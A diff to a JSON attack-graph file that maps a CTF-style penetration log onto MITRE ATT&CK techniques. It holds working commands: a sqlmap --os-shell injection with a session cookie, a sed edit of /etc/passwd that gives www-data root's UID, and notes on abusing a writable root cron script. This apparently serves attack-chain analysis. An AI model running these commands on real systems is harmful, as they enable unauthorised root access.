+      "output": "",
+      "exit_code": null,
+      "agent_name": "flag9f1f16",
+      "raw": {
+        "entry_id": 13,
+        "tool": "sqlmap",
+        "action": "os_shell_access",
+        "target": "http://10.0.2.197/php/recherche_old.php",
+        "phase": "exploitation",
+        "is_noise": false,
+        "cleaned_command": "sqlmap -u \"http://10.0.2.197/php/recherche_old.php\" --data=\"recherche=&btnRechercher=Rechercher\" --cookie=\"PHPSESSID=tv27194dltn7srq401bhf4r237\" -p recherche --os-shell --batch"
+      },
+      "mitre": {
+        "entry_id": 13,
+        "technique_id": "T1190",
+        "technique_name": "Exploit Public-Facing Application",
+        "tactic": "initial-access",
+        "confidence": 0.93
+      },
+      "actions_effects": {
+        "entry_id": 13,
+        "action_name": "exploitSQLiOSShell",
+        "action_description": "Use sqlmap's --os-shell feature against a vulnerable PHP parameter to gain an interactive OS shell on the target.",
+        "phase": "exploitation",
+        "produces_effects": [
+          "osShellAccess"
+        ],
+        "requires_effects": [
+          "sqlInjectionVulnFound"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#e84a4a",
+      "color_mitre": "#c97fc9",
+      "color_action": "#e84a4a"
+    },
+    {
+      "id": "cmd::14",
+      "layer": "command",
+      "label": "whoami",
+      "entry_id": 14,
+      "source_file": "flag9f1f16.txt",
+      "command": "whoami",
+      "reasoning": "and just replace that with new cookie that u get everytime once u login, your username is",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flag9f1f16",
+      "raw": {
+        "entry_id": 14,
+        "tool": "whoami",
+        "action": "identify_user",
+        "target": "10.0.2.197",
+        "phase": "post-exploitation",
+        "is_noise": false,
+        "cleaned_command": "whoami"
+      },
+      "mitre": {
+        "entry_id": 14,
+        "technique_id": "T1082",
+        "technique_name": "System Information Discovery",
+        "tactic": "discovery",
+        "confidence": 0.92
+      },
+      "actions_effects": {
+        "entry_id": 14,
+        "action_name": "checkCurrentUser",
+        "action_description": "Run whoami to identify the current user context of the shell session.",
+        "phase": "post-exploitation",
+        "produces_effects": [
+          "currentUserIdentified"
+        ],
+        "requires_effects": [
+          "osShellAccess"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#f1c94e",
+      "color_mitre": "#e8884a",
+      "color_action": "#f1c94e"
+    },
+    {
+      "id": "cmd::15",
+      "layer": "command",
+      "label": "id",
+      "entry_id": 15,
+      "source_file": "flag9f1f16.txt",
+      "command": "id",
+      "reasoning": "do you want to retrieve the command standard output? [Y/n/a] Y command standard output: 'www-data'",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flag9f1f16",
+      "raw": {
+        "entry_id": 15,
         "tool": "id",
-        "action": "user_privilege_enumeration",
-        "target": "localhost",
+        "action": "identify_user",
+        "target": "10.0.2.197",
         "phase": "post-exploitation",
         "is_noise": false,
         "cleaned_command": "id"
       },
       "mitre": {
-        "entry_id": 7,
-        "technique_id": "T1033",
-        "technique_name": "System Owner/User Discovery",
+        "entry_id": 15,
+        "technique_id": "T1082",
+        "technique_name": "System Information Discovery",
         "tactic": "discovery",
-        "confidence": 0.99
+        "confidence": 0.92
       },
       "actions_effects": {
-        "entry_id": 7,
-        "action_name": "gatherSystemInfo",
-        "action_description": "Query the current user's UID, GID, and group memberships to assess privilege context.",
+        "entry_id": 15,
+        "action_name": "checkCurrentUser",
+        "action_description": "Run id to retrieve the current user's UID, GID, and group memberships.",
         "phase": "post-exploitation",
         "produces_effects": [
-          "currentUserKnown"
+          "currentUserIdentified"
+        ],
+        "requires_effects": [
+          "osShellAccess"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#f1c94e",
+      "color_mitre": "#e8884a",
+      "color_action": "#f1c94e"
+    },
+    {
+      "id": "cmd::16",
+      "layer": "command",
+      "label": "",
+      "entry_id": 16,
+      "source_file": "flag9f1f16.txt",
+      "command": "",
+      "reasoning": "do you want to retrieve the command standard output? [Y/n/a] Y command standard output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flag9f1f16",
+      "raw": {
+        "entry_id": 16,
+        "tool": "",
+        "action": "",
+        "target": "",
+        "phase": "noise",
+        "is_noise": true,
+        "cleaned_command": ""
+      },
+      "mitre": {
+        "entry_id": 16,
+        "technique_id": "T0000",
+        "technique_name": "Noise",
+        "tactic": "none",
+        "confidence": 0.0
+      },
+      "actions_effects": {
+        "entry_id": 16,
+        "action_name": "noise",
+        "action_description": "Empty command entry whose reasoning only shows the id command output confirming www-data identity.",
+        "phase": "noise",
+        "produces_effects": [],
+        "requires_effects": [],
+        "is_noise": true
+      },
+      "color_command": "#555555",
+      "color_mitre": "#888888",
+      "color_action": "#555555"
+    },
+    {
+      "id": "cmd::17",
+      "layer": "command",
+      "label": "ls -la /etc/cron.*",
+      "entry_id": 17,
+      "source_file": "flag9f1f16.txt",
+      "command": "ls -la /etc/cron.*",
+      "reasoning": "so youre www-data, but to gain access to do stuff over the host, u need root access so were supposed to do privelege escalation so we find stuff in crontab that get run based on schedule which you have write access to",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flag9f1f16",
+      "raw": {
+        "entry_id": 17,
+        "tool": "ls",
+        "action": "enumerate_crontabs",
+        "target": "/etc/cron.*",
+        "phase": "post-exploitation",
+        "is_noise": false,
+        "cleaned_command": "ls -la /etc/cron.*"
+      },
+      "mitre": {
+        "entry_id": 17,
+        "technique_id": "T1083",
+        "technique_name": "File and Directory Discovery",
+        "tactic": "discovery",
+        "confidence": 0.85
+      },
+      "actions_effects": {
+        "entry_id": 17,
+        "action_name": "enumerateCronJobs",
+        "action_description": "List all cron directories and their file permissions to identify writable cron scripts executable by root.",
+        "phase": "post-exploitation",
+        "produces_effects": [
+          "cronJobsEnumerated",
+          "writableCronJobFound"
+        ],
+        "requires_effects": [
+          "osShellAccess",
+          "currentUserIdentified"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#f1c94e",
+      "color_mitre": "#e8884a",
+      "color_action": "#f1c94e"
+    },
+    {
+      "id": "cmd::18",
+      "layer": "command",
+      "label": "sed -i 's#www-data:x:33:33:www-data:/var/www:/usr/sbin/nolog",
+      "entry_id": 18,
+      "source_file": "flag9f1f16.txt",
+      "command": "sed -i 's#www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin#www-data:x:0:0:root:/root:/bin/bash#' /etc/passwd",
+      "reasoning": "do you want to retrieve the command standard output? [Y/n/a] Y command standard output: --- /etc/cron.d: total 20 drwxr-xr-x   2 root root 4096 Aug 21 01:04 . drwxr-xr-x 104 root root 4096 Oct  8 23:40 .. -rw-r--r--   1 root root  102 Mar 23  2022 .placeholder -rw-r--r--   1 root root  201 Jan  8  2022 e2scrub_all -rw-r--r--   1 root root  712 Jan 28  2022 php /etc/cron.daily: total 40 drwxr-xr-x   2 root root 4096 Aug 21 01:03 . drwxr-xr-x 104 root root 4096 Oct  8 23:40 .. -rw-r--r--   1 root root  102 Mar 23  2022 .placeholder -rwxr-xr-x   1 root root  564 Sep 26  2020 acct -rwxr-xr-x   1 root root  539 Mar 18  2024 apache2 -rwxr-xr-x   1 root root  376 Jul 24  2023 apport -rwxr-xr-x   1 root root 1478 Apr  8  2022 apt-compat -rwxr-xr-x   1 root root  123 Dec  5  2021 dpkg -rwxr-xr-x   1 root root  377 Jan 24  2022 logrotate -rwxr-xr-x   1 root root 1330 Mar 17  2022 man-db /etc/cron.hourly: total 16 drwxr-xr-x   2 root     root     4096 Aug 21 01:26 . drwxr-xr-x 104 root     root     4096 Oct  8 23:40 .. -rw-r--r--   1 root     root      102 Mar 23  2022 .placeholder -rwxrwxrwx   1 www-data www-data   12 Oct  8 23:42 cuiteur-cleaning /etc/cron.monthly: total 16 drwxr-xr-x   2 root root 4096 Aug  7 22:32 . drwxr-xr-x 104 root root 4096 Oct  8 23:40 .. -rw-r--r--   1 root root  102 Mar 23  2022 .placeholder -rwxr-xr-x   1 root root 2203 Sep 26  2020 acct /etc/cron.weekly: total 16 drwxr-xr-x   2 root root 4096 Jan 28  2025 . drwxr-xr-x 104 root root 4096 Oct  8 23:40 .. -rw-r--r--   1 root root  102 Mar 23  2022 .placeholder -rwxr-xr-x   1 root root 1020 Mar 17  2022 man-db --- so in cron hourly there is a file which has write access to www-data this file is being run by root but has write access to us, making it a entry point to get root privileges so I edited the file /etc/cron.hourly/cuiteur-cleaning to grant myself root access as follows echo '#!/bin/bash' > /etc/cron.hourly/cuiteur-cleaning rewrites the whole file which the mentioned under ''(rewrites cuz we're using > appends if we're using >>)",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flag9f1f16",
+      "raw": {
+        "entry_id": 18,
+        "tool": "sed",
+        "action": "privilege_escalation",
+        "target": "/etc/passwd",
+        "phase": "post-exploitation",
+        "is_noise": false,
+        "cleaned_command": "sed -i 's#www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin#www-data:x:0:0:root:/root:/bin/bash#' /etc/passwd"
+      },
+      "mitre": {
+        "entry_id": 18,
+        "technique_id": "T1098",
+        "technique_name": "Account Manipulation",
+        "tactic": "privilege-escalation",
+        "confidence": 0.88
+      },
+      "actions_effects": {
+        "entry_id": 18,
+        "action_name": "escalatePrivileges",
+        "action_description": "Inject a sed command into a root-owned but world-writable cron script to overwrite /etc/passwd and grant the www-data user root-level UID.",
+        "phase": "post-exploitation",
+        "produces_effects": [
+          "privilegesEscalated",
+          "rootAccessGained"
+        ],
+        "requires_effects": [
+          "writableCronJobFound"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#f1c94e",
+      "color_mitre": "#e84a4a",
+      "color_action": "#f1c94e"
+    },
+    {
+      "id": "cmd::19",
+      "layer": "command",
+      "label": "cat /etc/passwd",
+      "entry_id": 19,
+      "source_file": "flag9f1f16.txt",
+      "command": "cat /etc/passwd",
+      "reasoning": "echo \"www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\" >> /etc/passwd echo \"www-data:password123\" | chpasswd echo these three commands into the cuiteur cleaning file and chmod -x to make it executable again the first command uses sed to find and replace the current uID of www-data with the same uID as root in the file etc/passwd, where all user and user priveleges are stored the second command appends the command to assign www-data the old uID the device remembers, so this makes www-data has 2 uIDs, making that user act as root and normal third command adds a password to the root login for www-data and the password I set was password123. Wait for this cron job to run and then once it run try with the following command",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flag9f1f16",
+      "raw": {
+        "entry_id": 19,
+        "tool": "cat",
+        "action": "read_file",
+        "target": "/etc/passwd",
+        "phase": "post-exploitation",
+        "is_noise": false,
+        "cleaned_command": "cat /etc/passwd"
+      },
+      "mitre": {
+        "entry_id": 19,
+        "technique_id": "T1003.008",
+        "technique_name": "OS Credential Dumping: /etc/passwd and /etc/shadow",
+        "tactic": "credential-access",
+        "confidence": 0.87
+      },
+      "actions_effects": {
+        "entry_id": 19,
+        "action_name": "readSensitiveFile",
+        "action_description": "Read /etc/passwd to verify that the privilege escalation modification to user entries was applied successfully.",
+        "phase": "post-exploitation",
+        "produces_effects": [
+          "passwdFileRead"
+        ],
+        "requires_effects": [
+          "osShellAccess",
+          "privilegesEscalated"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#f1c94e",
+      "color_mitre": "#da77f2",
+      "color_action": "#f1c94e"
+    },
+    {
+      "id": "cmd::20",
+      "layer": "command",
+      "label": "should show 2 entries for www-data and one with uID 0 and on",
+      "entry_id": 20,
+      "source_file": "flag9f1f16.txt",
+      "command": "should show 2 entries for www-data and one with uID 0 and one with 33",
+      "reasoning": "",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flag9f1f16",
+      "raw": {
+        "entry_id": 20,
+        "tool": "",
+        "action": "",
+        "target": "",
+        "phase": "noise",
+        "is_noise": true,
+        "cleaned_command": "should show 2 entries for www-data and one with uID 0 and one with 33"
+      },
+      "mitre": {
+        "entry_id": 20,
+        "technique_id": "T0000",
+        "technique_name": "Noise",
+        "tactic": "none",
+        "confidence": 0.0
+      },
+      "actions_effects": {
+        "entry_id": 20,
+        "action_name": "noise",
+        "action_description": "Prose note about expected /etc/passwd output entries for www-data and uid 0/33.",
+        "phase": "noise",
+        "produces_effects": [],
+        "requires_effects": [],
+        "is_noise": true
+      },
+      "color_command": "#555555",
+      "color_mitre": "#888888",
+      "color_action": "#555555"
+    },
+    {
+      "id": "cmd::21",
+      "layer": "command",
+      "label": "cat /etc/crontab",
+      "entry_id": 21,
+      "source_file": "flag9f1f16.txt",
+      "command": "cat /etc/crontab",
+      "reasoning": "if its there echo 'password123' | su www-data -c 'ls -la /root/' and flag should be there to download the flag i did chmod 644 to change file permissions copied it to the current directory and then did wget and boom, flag on my pc To check whcih cron job runs when",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flag9f1f16",
+      "raw": {
+        "entry_id": 21,
+        "tool": "cat",
+        "action": "read_crontab",
+        "target": "/etc/crontab",
+        "phase": "post-exploitation",
+        "is_noise": false,
+        "cleaned_command": "cat /etc/crontab"
+      },
+      "mitre": {
+        "entry_id": 21,
+        "technique_id": "T1053.003",
+        "technique_name": "Scheduled Task/Job: Cron",
+        "tactic": "discovery",
+        "confidence": 0.85
+      },
+      "actions_effects": {
+        "entry_id": 21,
+        "action_name": "readCrontab",
+        "action_description": "Read the system-wide crontab file to discover scheduled jobs and potential privilege escalation paths.",
+        "phase": "post-exploitation",
+        "produces_effects": [
+          "cronJobsEnumerated"
         ],
         "requires_effects": [
           "shellAccessGained"
@@ -449,436 +1051,1689 @@ const GRAPH = {
       "color_action": "#f1c94e"
     },
     {
-      "id": "cmd::8",
+      "id": "cmd::22",
       "layer": "command",
-      "label": "sudo -l",
-      "entry_id": 8,
-      "source_file": "example.txt",
-      "command": "sudo -l",
-      "reasoning": "",
+      "label": "/etc/crontab: system-wide crontab",
+      "entry_id": 22,
+      "source_file": "flag9f1f16.txt",
+      "command": "/etc/crontab: system-wide crontab",
+      "reasoning": "do you want to retrieve the command standard output? [Y/n/a] Y command standard output: ---",
       "output": "",
       "exit_code": null,
-      "agent_name": "example",
+      "agent_name": "flag9f1f16",
       "raw": {
-        "entry_id": 8,
-        "tool": "sudo",
-        "action": "sudo_permission_enumeration",
-        "target": "localhost",
-        "phase": "post-exploitation",
-        "is_noise": false,
-        "cleaned_command": "sudo -l"
+        "entry_id": 22,
+        "tool": "",
+        "action": "",
+        "target": "",
+        "phase": "noise",
+        "is_noise": true,
+        "cleaned_command": "/etc/crontab: system-wide crontab"
       },
       "mitre": {
-        "entry_id": 8,
-        "technique_id": "T1548.003",
-        "technique_name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
-        "tactic": "privilege-escalation",
-        "confidence": 0.96
+        "entry_id": 22,
+        "technique_id": "T0000",
+        "technique_name": "Noise",
+        "tactic": "none",
+        "confidence": 0.0
       },
       "actions_effects": {
-        "entry_id": 8,
-        "action_name": "checkSudoPrivileges",
-        "action_description": "List sudo permissions available to the current user to identify potential privilege escalation paths.",
-        "phase": "post-exploitation",
-        "produces_effects": [
-          "sudoPrivilegesKnown"
-        ],
-        "requires_effects": [
-          "shellAccessGained"
-        ],
-        "is_noise": false
+        "entry_id": 22,
+        "action_name": "noise",
+        "action_description": "Crontab file header line printed as output, not an attacker command.",
+        "phase": "noise",
+        "produces_effects": [],
+        "requires_effects": [],
+        "is_noise": true
       },
-      "color_command": "#f1c94e",
-      "color_mitre": "#e84a4a",
-      "color_action": "#f1c94e"
+      "color_command": "#555555",
+      "color_mitre": "#888888",
+      "color_action": "#555555"
     },
     {
-      "id": "cmd::9",
+      "id": "cmd::23",
       "layer": "command",
-      "label": "find / -perm -4000 -type f 2>/dev/null",
-      "entry_id": 9,
-      "source_file": "example.txt",
-      "command": "find / -perm -4000 -type f 2>/dev/null",
+      "label": "Unlike any other crontab you don't have to run the `crontab'",
+      "entry_id": 23,
+      "source_file": "flag9f1f16.txt",
+      "command": "Unlike any other crontab you don't have to run the `crontab'",
       "reasoning": "",
       "output": "",
       "exit_code": null,
-      "agent_name": "example",
+      "agent_name": "flag9f1f16",
       "raw": {
-        "entry_id": 9,
-        "tool": "find",
-        "action": "suid_binary_enumeration",
-        "target": "localhost",
-        "phase": "post-exploitation",
-        "is_noise": false,
-        "cleaned_command": "find / -perm -4000 -type f 2>/dev/null"
+        "entry_id": 23,
+        "tool": "",
+        "action": "",
+        "target": "",
+        "phase": "noise",
+        "is_noise": true,
+        "cleaned_command": "Unlike any other crontab you don't have to run the `crontab'"
       },
       "mitre": {
-        "entry_id": 9,
-        "technique_id": "T1548.001",
-        "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
-        "tactic": "privilege-escalation",
+        "entry_id": 23,
+        "technique_id": "T0000",
+        "technique_name": "Noise",
+        "tactic": "none",
+        "confidence": 0.0
+      },
+      "actions_effects": {
+        "entry_id": 23,
+        "action_name": "noise",
+        "action_description": "Crontab file comment line about editing behavior, not an attacker command.",
+        "phase": "noise",
+        "produces_effects": [],
+        "requires_effects": [],
+        "is_noise": true
+      },
+      "color_command": "#555555",
+      "color_mitre": "#888888",
+      "color_action": "#555555"
+    },
+    {
+      "id": "cmd::24",
+      "layer": "command",
+      "label": "command to install the new version when you edit this file",
+      "entry_id": 24,
+      "source_file": "flag9f1f16.txt",
+      "command": "command to install the new version when you edit this file",
+      "reasoning": "",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flag9f1f16",
+      "raw": {
+        "entry_id": 24,
+        "tool": "",
+        "action": "",
+        "target": "",
+        "phase": "noise",
+        "is_noise": true,
+        "cleaned_command": "command to install the new version when you edit this file"
+      },
+      "mitre": {
+        "entry_id": 24,
+        "technique_id": "T0000",
+        "technique_name": "Noise",
+        "tactic": "none",
+        "confidence": 0.0
+      },
+      "actions_effects": {
+        "entry_id": 24,
+        "action_name": "noise",
+        "action_description": "Crontab file comment about installing new versions, not an attacker command.",
+        "phase": "noise",
+        "produces_effects": [],
+        "requires_effects": [],
+        "is_noise": true
+      },
+      "color_command": "#555555",
+      "color_mitre": "#888888",
+      "color_action": "#555555"
+    },
+    {
+      "id": "cmd::25",
+      "layer": "command",
+      "label": "and files in /etc/cron.d. These files also have username fie",
+      "entry_id": 25,
+      "source_file": "flag9f1f16.txt",
+      "command": "and files in /etc/cron.d. These files also have username fields,",
+      "reasoning": "",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flag9f1f16",
+      "raw": {
+        "entry_id": 25,
+        "tool": "",
+        "action": "",
+        "target": "",
+        "phase": "noise",
+        "is_noise": true,
+        "cleaned_command": "and files in /etc/cron.d. These files also have username fields,"
+      },
+      "mitre": {
+        "entry_id": 25,
+        "technique_id": "T0000",
+        "technique_name": "Noise",
+        "tactic": "none",
+        "confidence": 0.0
+      },
+      "actions_effects": {
+        "entry_id": 25,
+        "action_name": "noise",
+        "action_description": "Crontab file comment referencing /etc/cron.d and username fields, not an attacker command.",
+        "phase": "noise",
+        "produces_effects": [],
+        "requires_effects": [],
+        "is_noise": true
+      },
+      "color_command": "#555555",
+      "color_mitre": "#888888",
+      "color_action": "#555555"
+    },
+    {
+      "id": "cmd::26",
+      "layer": "command",
+      "label": "that none of the other crontabs do.",
+      "entry_id": 26,
+      "source_file": "flag9f1f16.txt",
+      "command": "that none of the other crontabs do.",
+      "reasoning": "",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flag9f1f16",
+      "raw": {
+        "entry_id": 26,
+        "tool": "",
+        "action": "",
+        "target": "",
+        "phase": "noise",
+        "is_noise": true,
+        "cleaned_command": "that none of the other crontabs do."
+      },
+      "mitre": {
+        "entry_id": 26,
+        "technique_id": "T0000",
+        "technique_name": "Noise",
+        "tactic": "none",
+        "confidence": 0.0
+      },
+      "actions_effects": {
+        "entry_id": 26,
+        "action_name": "noise",
+        "action_description": "Continuation of crontab file comment line, not an attacker command.",
+        "phase": "noise",
+        "produces_effects": [],
+        "requires_effects": [],
+        "is_noise": true
+      },
+      "color_command": "#555555",
+      "color_mitre": "#888888",
+      "color_action": "#555555"
+    },
+    {
+      "id": "cmd::27",
+      "layer": "command",
+      "label": "SHELL=/bin/sh",
+      "entry_id": 27,
+      "source_file": "flag9f1f16.txt",
+      "command": "SHELL=/bin/sh",
+      "reasoning": "",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flag9f1f16",
+      "raw": {
+        "entry_id": 27,
+        "tool": "",
+        "action": "",
+        "target": "",
+        "phase": "noise",
+        "is_noise": true,
+        "cleaned_command": "SHELL=/bin/sh"
+      },
+      "mitre": {
+        "entry_id": 27,
+        "technique_id": "T0000",
+        "technique_name": "Noise",
+        "tactic": "none",
+        "confidence": 0.0
+      },
+      "actions_effects": {
+        "entry_id": 27,
+        "action_name": "noise",
+        "action_description": "Crontab file SHELL variable assignment printed as output, not an attacker command.",
+        "phase": "noise",
+        "produces_effects": [],
+        "requires_effects": [],
+        "is_noise": true
+      },
+      "color_command": "#555555",
+      "color_mitre": "#888888",
+      "color_action": "#555555"
+    },
+    {
+      "id": "cmd::28",
+      "layer": "command",
+      "label": "You can also override PATH, but by default, newer versions i",
+      "entry_id": 28,
+      "source_file": "flag9f1f16.txt",
+      "command": "You can also override PATH, but by default, newer versions inherit it from the environment",
+      "reasoning": "",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flag9f1f16",
+      "raw": {
+        "entry_id": 28,
+        "tool": "",
+        "action": "",
+        "target": "",
+        "phase": "noise",
+        "is_noise": true,
+        "cleaned_command": "You can also override PATH, but by default, newer versions inherit it from the environment"
+      },
+      "mitre": {
+        "entry_id": 28,
+        "technique_id": "T0000",
+        "technique_name": "Noise",
+        "tactic": "none",
+        "confidence": 0.0
+      },
+      "actions_effects": {
+        "entry_id": 28,
+        "action_name": "noise",
+        "action_description": "Crontab file comment about PATH inheritance, not an attacker command.",
+        "phase": "noise",
+        "produces_effects": [],
+        "requires_effects": [],
+        "is_noise": true
+      },
+      "color_command": "#555555",
+      "color_mitre": "#888888",
+      "color_action": "#555555"
+    },
+    {
+      "id": "cmd::29",
+      "layer": "command",
+      "label": "Example of job definition:",
+      "entry_id": 29,
+      "source_file": "flag9f1f16.txt",
+      "command": "Example of job definition:",
+      "reasoning": "#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flag9f1f16",
+      "raw": {
+        "entry_id": 29,
+        "tool": "",
+        "action": "",
+        "target": "",
+        "phase": "noise",
+        "is_noise": true,
+        "cleaned_command": "Example of job definition:"
+      },
+      "mitre": {
+        "entry_id": 29,
+        "technique_id": "T0000",
+        "technique_name": "Noise",
+        "tactic": "none",
+        "confidence": 0.0
+      },
+      "actions_effects": {
+        "entry_id": 29,
+        "action_name": "noise",
+        "action_description": "Crontab file example job definition header comment, not an attacker command.",
+        "phase": "noise",
+        "produces_effects": [],
+        "requires_effects": [],
+        "is_noise": true
+      },
+      "color_command": "#555555",
+      "color_mitre": "#888888",
+      "color_action": "#555555"
+    },
+    {
+      "id": "cmd::30",
+      "layer": "command",
+      "label": ".---------------- minute (0 - 59)",
+      "entry_id": 30,
+      "source_file": "flag9f1f16.txt",
+      "command": ".---------------- minute (0 - 59)",
+      "reasoning": "",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flag9f1f16",
+      "raw": {
+        "entry_id": 30,
+        "tool": "",
+        "action": "",
+        "target": "",
+        "phase": "noise",
+        "is_noise": true,
+        "cleaned_command": ".---------------- minute (0 - 59)"
+      },
+      "mitre": {
+        "entry_id": 30,
+        "technique_id": "T0000",
+        "technique_name": "Noise",
+        "tactic": "none",
+        "confidence": 0.0
+      },
+      "actions_effects": {
+        "entry_id": 30,
+        "action_name": "noise",
+        "action_description": "Crontab file format diagram comment for minute field, not an attacker command.",
+        "phase": "noise",
+        "produces_effects": [],
+        "requires_effects": [],
+        "is_noise": true
+      },
+      "color_command": "#555555",
+      "color_mitre": "#888888",
+      "color_action": "#555555"
+    },
+    {
+      "id": "cmd::31",
+      "layer": "command",
+      "label": "|  .------------- hour (0 - 23)",
+      "entry_id": 31,
+      "source_file": "flag9f1f16.txt",
+      "command": "|  .------------- hour (0 - 23)",
+      "reasoning": "",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flag9f1f16",
+      "raw": {
+        "entry_id": 31,
+        "tool": "",
+        "action": "",
+        "target": "",
+        "phase": "noise",
+        "is_noise": true,
+        "cleaned_command": "|  .------------- hour (0 - 23)"
+      },
+      "mitre": {
+        "entry_id": 31,
+        "technique_id": "T0000",
+        "technique_name": "Noise",
+        "tactic": "none",
+        "confidence": 0.0
+      },
+      "actions_effects": {
+        "entry_id": 31,
+        "action_name": "noise",
+        "action_description": "Crontab file format diagram comment for hour field, not an attacker command.",
+        "phase": "noise",
+        "produces_effects": [],
+        "requires_effects": [],
+        "is_noise": true
+      },
+      "color_command": "#555555",
+      "color_mitre": "#888888",
+      "color_action": "#555555"
+    },
+    {
+      "id": "cmd::32",
+      "layer": "command",
+      "label": "|  |  .---------- day of month (1 - 31)",
+      "entry_id": 32,
+      "source_file": "flag9f1f16.txt",
+      "command": "|  |  .---------- day of month (1 - 31)",
+      "reasoning": "",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flag9f1f16",
+      "raw": {
+        "entry_id": 32,
+        "tool": "",
+        "action": "",
+        "target": "",
+        "phase": "noise",
+        "is_noise": true,
+        "cleaned_command": "|  |  .---------- day of month (1 - 31)"
+      },
+      "mitre": {
+        "entry_id": 32,
+        "technique_id": "T0000",
+        "technique_name": "Noise",
+        "tactic": "none",
+        "confidence": 0.0
+      },
+      "actions_effects": {
+        "entry_id": 32,
+        "action_name": "noise",
+        "action_description": "Crontab file format diagram comment for day-of-month field, not an attacker command.",
+        "phase": "noise",
+        "produces_effects": [],
+        "requires_effects": [],
+        "is_noise": true
+      },
+      "color_command": "#555555",
+      "color_mitre": "#888888",
+      "color_action": "#555555"
+    },
+    {
+      "id": "cmd::33",
+      "layer": "command",
+      "label": "|  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...",
+      "entry_id": 33,
+      "source_file": "flag9f1f16.txt",
+      "command": "|  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...",
+      "reasoning": "",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flag9f1f16",
+      "raw": {
+        "entry_id": 33,
+        "tool": "",
+        "action": "",
+        "target": "",
+        "phase": "noise",
+        "is_noise": true,
+        "cleaned_command": "|  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ..."
+      },
+      "mitre": {
+        "entry_id": 33,
+        "technique_id": "T0000",
+        "technique_name": "Noise",
+        "tactic": "none",
+        "confidence": 0.0
+      },
+      "actions_effects": {
+        "entry_id": 33,
+        "action_name": "noise",
+        "action_description": "Crontab file format diagram comment for month field, not an attacker command.",
+        "phase": "noise",
+        "produces_effects": [],
+        "requires_effects": [],
+        "is_noise": true
+      },
+      "color_command": "#555555",
+      "color_mitre": "#888888",
+      "color_action": "#555555"
+    },
+    {
+      "id": "cmd::34",
+      "layer": "command",
+      "label": "|  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun",
+      "entry_id": 34,
+      "source_file": "flag9f1f16.txt",
+      "command": "|  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat",
+      "reasoning": "",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flag9f1f16",
+      "raw": {
+        "entry_id": 34,
+        "tool": "",
+        "action": "",
+        "target": "",
+        "phase": "noise",
+        "is_noise": true,
+        "cleaned_command": "|  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat"
+      },
+      "mitre": {
+        "entry_id": 34,
+        "technique_id": "T0000",
+        "technique_name": "Noise",
+        "tactic": "none",
+        "confidence": 0.0
+      },
+      "actions_effects": {
+        "entry_id": 34,
+        "action_name": "noise",
+        "action_description": "Crontab file format diagram comment for day-of-week field, not an attacker command.",
+        "phase": "noise",
+        "produces_effects": [],
+        "requires_effects": [],
+        "is_noise": true
+      },
+      "color_command": "#555555",
+      "color_mitre": "#888888",
+      "color_action": "#555555"
+    },
+    {
+      "id": "cmd::35",
+      "layer": "command",
+      "label": "|  |  |  |  |",
+      "entry_id": 35,
+      "source_file": "flag9f1f16.txt",
+      "command": "|  |  |  |  |",
+      "reasoning": "",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flag9f1f16",
+      "raw": {
+        "entry_id": 35,
+        "tool": "",
+        "action": "",
+        "target": "",
+        "phase": "noise",
+        "is_noise": true,
+        "cleaned_command": "|  |  |  |  |"
+      },
+      "mitre": {
+        "entry_id": 35,
+        "technique_id": "T0000",
+        "technique_name": "Noise",
+        "tactic": "none",
+        "confidence": 0.0
+      },
+      "actions_effects": {
+        "entry_id": 35,
+        "action_name": "noise",
+        "action_description": "Crontab file format diagram separator line, not an attacker command.",
+        "phase": "noise",
+        "produces_effects": [],
+        "requires_effects": [],
+        "is_noise": true
+      },
+      "color_command": "#555555",
+      "color_mitre": "#888888",
+      "color_action": "#555555"
+    },
+    {
+      "id": "cmd::36",
+      "layer": "command",
+      "label": "*  *  *  *  * user-name command to be executed",
+      "entry_id": 36,
+      "source_file": "flag9f1f16.txt",
+      "command": "*  *  *  *  * user-name command to be executed",
+      "reasoning": "",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flag9f1f16",
+      "raw": {
+        "entry_id": 36,
+        "tool": "",
+        "action": "",
+        "target": "",
+        "phase": "noise",
+        "is_noise": true,
+        "cleaned_command": "*  *  *  *  * user-name command to be executed"
+      },
+      "mitre": {
+        "entry_id": 36,
+        "technique_id": "T0000",
+        "technique_name": "Noise",
+        "tactic": "none",
+        "confidence": 0.0
+      },
+      "actions_effects": {
+        "entry_id": 36,
+        "action_name": "noise",
